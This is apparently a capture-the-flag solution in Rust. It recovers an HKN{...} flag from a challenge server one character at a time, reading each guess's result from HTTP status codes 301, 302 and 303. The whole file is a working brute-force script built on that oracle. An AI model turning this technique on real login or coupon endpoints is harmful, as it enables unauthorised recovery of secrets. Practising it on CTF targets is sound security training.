use itertools::{FoldWhile, Itertools};
use reqwest::StatusCode;
use std::fmt::{Display, Formatter};

const MIN_INNER_SYMBOLS: &[char] = &['4', 'w', 'x', 'v', 'b', 'T', 'Y', 'H', 'J', 'K', 'N', '-'];
const EXTRA: &str = "HKN";

struct Flag<'a>(&'a str);
impl Display for Flag<'_> {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}{{{}}}", EXTRA, self.0)
    }
}

/// POST target: `https://aubergine.hkn/cupon`
/// payload: `cupon=<data>`
/// HTTP-status responses:
/// - 303 (partial)
/// - 301 (incorrect)
/// - 302 (complete)
fn main() {
    let req = reqwest::blocking::Client::new().post("https://aubergine.hkn/cupon");

    let complete = MIN_INNER_SYMBOLS
        .iter()
        .cycle()
        .fold_while(String::new(), |mut partial, &c| {
            partial.push(c);
            match loop {
                if let Ok(response) = req
                    .try_clone()
                    .unwrap()
                    .header("cupon", Flag(&partial).to_string())
                    .send()
                {
                    break response;
                }
            }
            .status()
            {
                // 301 (incorrect)
                StatusCode::MOVED_PERMANENTLY => {
                    let _ = partial.pop().unwrap(); // undo
                    FoldWhile::Continue(partial)
                }
                // 302 (complete)
                StatusCode::FOUND => FoldWhile::Done(partial),
                // 303 (next partial)
                StatusCode::SEE_OTHER => FoldWhile::Continue(partial),
                _ => unimplemented!("Unexpected status code"),
            }
        })
        .into_inner();

    println!("Password: {}", Flag(&complete));
}
